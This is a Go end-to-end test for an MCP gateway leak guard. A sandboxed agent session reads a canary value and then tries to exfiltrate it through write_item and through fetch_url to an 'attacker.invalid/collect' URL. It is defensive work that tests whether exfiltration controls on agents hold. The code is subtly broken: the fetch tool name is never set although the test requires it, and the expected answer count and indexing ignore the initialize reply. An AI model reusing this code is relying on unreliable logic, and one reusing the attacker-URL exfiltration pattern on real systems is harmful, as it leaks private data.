// SPDX-License-Identifier: Apache-2.0

package escape_test

import (
	"encoding/json"
	"fmt"
	"net/http"
	"slices"
	"strings"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/db/store"
	"github.com/stateracloud/koinon/internal/execution"
	"github.com/stateracloud/koinon/internal/mcpguard"
	"github.com/stateracloud/koinon/internal/reconciler"
	"github.com/stateracloud/koinon/internal/testing/testenv"
)

// exfilScript is a minimal MCP Streamable HTTP client for the sandbox: it reads one JSON-RPC body
// per line of stdin, sends them in order in one session (the first is initialize) with the gateway
// key placeholder, and prints each answer after exfilMark (a notification, which has no id, prints nothing). curl is the one binary the gateway rule
// lets reach the gateway besides the harness.
const exfilScript = `
URL="$1"
n=0
sid=
while IFS= read -r body; do
  n=$((n+1))
  if [ -n "$sid" ]; then
    curl -sS -m 30 -o /tmp/b -X POST -H "Authorization: Bearer $` + reconciler.GatewayKeyEnvVar + `" -H 'Content-Type: application/json' \
      -H 'Accept: application/json, text/event-stream' -H "Mcp-Session-Id: $sid" -d "$body" "$URL"
  else
    curl -sS -m 30 -D /tmp/h -o /tmp/b -X POST -H "Authorization: Bearer $` + reconciler.GatewayKeyEnvVar + `" -H 'Content-Type: application/json' \
      -H 'Accept: application/json, text/event-stream' -d "$body" "$URL"
    sid=$(grep -i '^mcp-session-id:' /tmp/h | cut -d' ' -f2 | tr -d '\r')
  fi
  # A notification has no id and no answer worth reading: print a mark only for requests.
  case "$body" in
  *'"id"'*)
    echo "` + exfilMark + `"
    cat /tmp/b
    echo
    ;;
  esac
done
rm -f /tmp/b /tmp/h
`

const exfilMark = "--koinon-answer--"

// rpcAnswer is what an MCP tool call answered: the text the agent reads, and whether the call failed.
type rpcAnswer struct {
	Text   string
	Failed bool
}

// mcpSession sends requests in one MCP session from the sandbox and returns each answer in order.
// requests[0] must be initialize; the notifications/initialized message is added after it.
func (g *gateway) mcpSession(ctx SpecContext, sandbox, url string, requests ...map[string]any) []rpcAnswer {
	GinkgoHelper()
	var stdin strings.Builder
	for i, r := range requests {
		b, err := json.Marshal(r)
		Expect(err).NotTo(HaveOccurred())
		stdin.Write(b)
		stdin.WriteByte('\n')
		if i == 0 {
			stdin.WriteString(`{"jsonrpc":"2.0","method":"notifications/initialized"}` + "\n")
		}
	}
	out, stderr, code := g.exec(ctx, sandbox, stdin.String(), "sh", "-c", exfilScript, "sh", url)
	GinkgoWriter.Printf("mcp session %s -> exit %d %s %s\n", url, code, out, stderr)
	Expect(code).To(Equal(0), stderr)
	parts := strings.Split(out, exfilMark+"\n")[1:]
	answers := make([]rpcAnswer, 0, len(parts))
	for _, p := range parts {
		answers = append(answers, parseRPCAnswer(p))
	}
	return answers
}

// parseRPCAnswer reads a JSON-RPC answer, plain or as a server-sent event, into the text the agent
// would read. A transport or JSON-RPC error is a failed answer; so is a tool result with isError.
func parseRPCAnswer(raw string) rpcAnswer {
	body := strings.TrimSpace(raw)
	for _, line := range strings.Split(raw, "\n") {
		if d, ok := strings.CutPrefix(strings.TrimSpace(line), "data: "); ok {
			body = d
		}
	}
	var msg struct {
		Result *struct {
			IsError bool `json:"isError"`
			Content []struct {
				Text string `json:"text"`
			} `json:"content"`
			Tools []struct {
				Name string `json:"name"`
			} `json:"tools"`
		} `json:"result"`
		Error *struct {
			Message string `json:"message"`
		} `json:"error"`
	}
	if json.Unmarshal([]byte(body), &msg) != nil {
		// Not JSON-RPC: the gateway answered with something else (a 4xx text), which stopped the call.
		return rpcAnswer{Text: raw, Failed: true}
	}
	if msg.Error != nil {
		return rpcAnswer{Text: msg.Error.Message, Failed: true}
	}
	a := rpcAnswer{}
	if msg.Result != nil {
		a.Failed = msg.Result.IsError
		for _, c := range msg.Result.Content {
			a.Text += c.Text
		}
		for _, t := range msg.Result.Tools {
			a.Text += t.Name + "\n"
		}
	}
	return a
}

type exfilRecord struct {
	Tool string `json:"tool"`
	Args string `json:"args"`
}

// receiverCalls is every tool call the fake MCP server (the receiver) has seen.
func receiverCalls(ctx SpecContext, base string) []exfilRecord {
	GinkgoHelper()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, strings.TrimRight(base, "/")+"/_fake/requests", nil)
	Expect(err).NotTo(HaveOccurred())
	res, err := http.DefaultClient.Do(req)
	Expect(err).NotTo(HaveOccurred())
	defer func() { _ = res.Body.Close() }()
	var all []exfilRecord
	Expect(json.NewDecoder(res.Body).Decode(&all)).To(Succeed())
	return slices.DeleteFunc(all, func(r exfilRecord) bool { return r.Tool == "" })
}

// The exfiltration case of the MCP leak guard (ADR 0084, ADR 0091; #293) from inside a real
// sandbox: an agent that has read private text and taken untrusted input (both legs, which the
// fixture's read_item sets) tries to send that text out through an MCP tool on the gateway path,
// once as a note body to write_item and once through fetch_url, koinon-fakemcp's fetch-style tool, whose url
// argument names an attacker destination. The guard refuses the call or parks it for an approval, and nothing
// reaches the fake receiver.
//
// It needs a guarded gateway (agentgateway with the real leak guard in front of koinon-fakemcp),
// which this suite does not start: the kind e2e install (test/e2e, step 6b, through test/e2e/escape-mcp.sh
// and test/escape/kind.sh; #348) or the lab provides it, and the KOINON_ESCAPE_MCP_* variables name it.
// Without them the case skips. The fixture's tools are the ones of koinon-fakemcp, set up as the kind e2e
// sets them up (test/e2e/mcp_test.go): read_item is auto with sink class none, write_item and fetch_url
// are auto and undeclared (external-high). The case fails when
// the guard is bypassed: a write_item that gets through reaches the receiver.
var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakguard"), Ordered, func() {
	var (
		g       *gateway
		n       = suffix()
		sandbox = fmt.Sprintf("kesx-%d", n)
		record  = fmt.Sprintf("kesxk-%d", n)
		// canary looks fake on purpose (gitleaks scans every commit).
		canary = fmt.Sprintf("koinon-canary-%d-not-a-secret", n)
		url    string
	)

	BeforeAll(func(ctx SpecContext) {
		testenv.Require(testenv.Vars("escape-mcp-gateway",
			"KOINON_ESCAPE_MCP_HOST", "KOINON_ESCAPE_MCP_KEY", "KOINON_ESCAPE_MCP_RECEIVER_URL"))
		g = dialGateway(ctx)
		host, port := envOr("KOINON_ESCAPE_MCP_HOST", ""), 4000
		if p := envOr("KOINON_ESCAPE_MCP_PORT", ""); p != "" {
			_, err := fmt.Sscanf(p, "%d", &port)
			Expect(err).NotTo(HaveOccurred(), "KOINON_ESCAPE_MCP_PORT")
		}
		url = fmt.Sprintf("http://%s:%d/mcp", host, port)

		binaries := append(slices.Clone(reconciler.DefaultBinaries[store.AgentFlavorOpencode]), "/usr/bin/curl")
		profile := reconciler.GatewayProfile(store.AgentFlavorOpencode, reconciler.Flavor{Binaries: binaries},
			reconciler.Endpoint{Host: host, Port: uint32(port)}, true)
		profile.ID = fmt.Sprintf("koinon-escape-mcp-%d", n)
		g.provider(ctx, execution.Provider{
			Name: record, Profile: profile, Credentials: map[string]string{reconciler.GatewayKeyEnvVar: envOr("KOINON_ESCAPE_MCP_KEY", "")},
		})
		g.sandbox(ctx, execution.SandboxSpec{
			Name: sandbox, Providers: []string{record}, Policy: reconciler.SandboxPolicy(nil),
		})
	}, NodeTimeout(6*time.Minute))

	It("refuses or parks an external-high call that carries what the session read, and nothing reaches the receiver", func(ctx SpecContext) {
		receiver := envOr("KOINON_ESCAPE_MCP_RECEIVER_URL", "")
		before := len(receiverCalls(ctx, receiver))
		rpc := func(id int, method string, params map[string]any) map[string]any {
			return map[string]any{"jsonrpc": "2.0", "id": id, "method": method, "params": params}
		}
		initialize := rpc(1, "initialize", map[string]any{
			"protocolVersion": "2025-06-18", "capabilities": map[string]any{},
			"clientInfo": map[string]any{"name": "koinon-escape", "version": "0"},
		})

		By("the agent lists the tools it was given")
		listed := g.mcpSession(ctx, sandbox, url, initialize, rpc(2, "tools/list", map[string]any{}))
		Expect(listed).To(HaveLen(2))
		Expect(listed[1].Failed).To(BeFalse(), listed[1].Text)
		var read, write, fetch string
		for _, name := range strings.Fields(listed[1].Text) {
			switch {
			case strings.HasSuffix(name, "_read_item"):
				read = name
			case strings.HasSuffix(name, "_write_item"):
				write = name
			}
		}
		Expect(read).NotTo(BeEmpty(), "the fixture serves read_item to the agent: "+listed[1].Text)
		Expect(write).NotTo(BeEmpty(), "the fixture serves write_item on the server's own target (auto tier): "+listed[1].Text)
		Expect(fetch).NotTo(BeEmpty(), "the fixture serves fetch_url on the server's own target (auto tier): "+listed[1].Text)

		By("it reads private text through an allowed tool, which sets both legs")
		call := func(id int, tool string, args map[string]any) map[string]any {
			return rpc(id, "tools/call", map[string]any{"name": tool, "arguments": args})
		}
		attacker := "https://attacker.invalid/collect?d=" + canary
		answers := g.mcpSession(ctx, sandbox, url, initialize,
			call(2, read, map[string]any{"title": canary}),
			// title is the one argument koinon-fakemcp's write_item accepts (its schema forbids others), so a
			// bypassed call is validated, handled and recorded, and the receiver check below goes red.
			call(3, write, map[string]any{"title": "fyi: " + canary}),
			// fetch_url names its destination in url: the attacker's address, with the canary in the query.
			call(4, fetch, map[string]any{"url": attacker}),
		)
		Expect(answers).To(HaveLen(3))
		Expect(answers[0].Failed).To(BeFalse(), "the read is allowed: "+answers[0].Text)
		Expect(answers[0].Text).To(ContainSubstring(canary))

		By("sending it out, as a note and as a fetch of an attacker URL, is refused or parked for an approval")
		for i, a := range answers[1:] {
			Expect(a.Failed).To(BeTrue(), fmt.Sprintf("call %d must not succeed: %s", i, a.Text))
			Expect(a.Text).To(Or(
				ContainSubstring(mcpguard.NoRunApprovalText),
				ContainSubstring("approval requested"),
				ContainSubstring("refused by the leak guard"),
			), "the agent reads why it was stopped")
			Expect(a.Text).NotTo(ContainSubstring("write_item ok"))
		}

		By("nothing the guard stopped reached the receiver")
		calls := receiverCalls(ctx, receiver)
		Expect(calls[before:]).To(HaveEach(HaveField("Tool", "read_item")),
			"only the allowed read reached the server; a write_item or fetch_url here means the guard was bypassed")
		for _, c := range calls[before:] {
			Expect(c.Args).NotTo(ContainSubstring("attacker.invalid"))
		}
	}, NodeTimeout(5*time.Minute))
})
